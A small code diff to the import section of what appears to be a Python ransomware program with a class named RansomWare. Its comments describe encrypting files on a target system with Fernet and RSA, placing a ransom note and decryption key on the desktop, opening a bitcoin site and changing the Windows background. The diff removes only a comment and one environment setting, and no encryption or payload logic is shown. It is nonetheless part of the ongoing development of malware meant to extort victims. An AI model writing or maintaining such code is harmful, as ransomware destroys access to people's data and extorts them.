@@ -1,5 +1,5 @@
 # Local Imports
-import os  # to get system root
+import os
 import webbrowser  # to load browser to go to specific website eg bitcoin
 import ctypes  # so we can interact with windows dlls and change windows background etc
 import urllib.request  # used for downloading and saving background image
@@ -14,8 +14,6 @@ import threading  # used for ransom note and decryption key on desktop
 from cryptography.fernet import Fernet  # encrypt/decrypt files on target system
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
-
-os.environ["CRYPTOGRAPHY_OPENSSL_NO_LEGACY"] = "1"
 
 
 class RansomWare:
